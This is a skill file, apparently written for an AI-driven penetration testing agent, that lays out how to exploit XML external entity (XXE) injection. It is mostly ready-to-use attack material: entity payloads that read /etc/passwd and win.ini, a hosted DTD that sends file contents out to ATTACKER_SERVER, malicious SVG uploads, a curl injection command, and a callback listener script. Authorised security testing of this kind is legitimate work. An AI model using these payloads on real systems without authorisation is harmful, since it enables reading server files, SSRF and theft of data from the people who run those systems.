---
name: attack-xxe
description: Apply when an endpoint parses XML (SOAP, file upload of SVG/DOCX/XLSX, SAML, RSS), to test whether external entity resolution allows file read, SSRF, or blind data exfiltration.
metadata:
  cyberstrike:
    source: .cyberstrike/skill/attack-xxe/SKILL.md
    commit: 359655518
---

# XML External Entity (XXE) Injection

## Objective

Exploit XML parsing vulnerabilities to read local files, perform SSRF, or exfiltrate data via out-of-band channels.

## Testing Methodology

### Phase 1: Identify XML Processing

Look for endpoints accepting:
- `Content-Type: application/xml` or `text/xml`
- SOAP endpoints (`.asmx`, `.wsdl`)
- File upload accepting SVG, DOCX, XLSX
- RSS/Atom feed processing
- SAML authentication

### Phase 2: In-Band XXE (File Read)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**Windows targets:**
```xml
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
```

### Phase 3: Blind XXE (Out-of-Band)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_SERVER/xxe.dtd">
  %xxe;
]>
<root>test</root>
```

**Hosted DTD (xxe.dtd):**
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_SERVER/?data=%file;'>">
%eval;
%exfil;
```

Use an OOB listener for callback detection:
```bash
# Start an OOB listener — logs every inbound request to xxe_hits.json
python3 - <<'PY' &
import http.server, json, datetime

LOG = "xxe_hits.json"

class Handler(http.server.BaseHTTPRequestHandler):
    def _log(self):
        entry = {
            "time": datetime.datetime.utcnow().isoformat(),
            "method": self.command,
            "path": self.path,
            "headers": dict(self.headers),
            "client": self.client_address[0],
        }
        with open(LOG, "a") as f:
            f.write(json.dumps(entry) + "\n")
        self.send_response(200)
        self.end_headers()

    do_GET = do_POST = _log

http.server.HTTPServer(("0.0.0.0", 8888), Handler).serve_forever()
PY
# Substitute an external collaborator (e.g. interact.sh) when the target
# cannot reach your host directly.
```

### Phase 4: XXE via File Upload

**SVG:**
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

**DOCX:** Modify `[Content_Types].xml` or `word/document.xml` inside the ZIP.

### Phase 5: Content-Type Manipulation

```bash
# Switch JSON endpoint to XML
curl -X POST https://TARGET/api/data \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

### Phase 6: Parameter Entity Injection

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % a "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>">
  %a;
]>
<root>&xxe;</root>
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| File contents read (e.g., /etc/passwd) | Critical (P1) |
| Out-of-band DNS/HTTP callback | High (P2) |
| SSRF via XXE | High (P2) |
| Denial of Service (billion laughs) | Medium (P3) |
| Error-based file path disclosure | Low (P4) |

## Evidence Requirements

- XML payload sent
- Response containing file contents or error
- For blind XXE: OOB interaction evidence (DNS/HTTP callback)
- Server type and parser identified

## Tools

- `python3 -m http.server`-style listener (Phase 3) — OOB callback listener for blind XXE; substitute an external collaborator when needed
- Manual SVG/DOCX crafting (Phase 4) — upload-based XXE via file parsing

## References

- [PortSwigger: XXE](https://portswigger.net/web-security/xxe)
- [OWASP: XXE Prevention](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
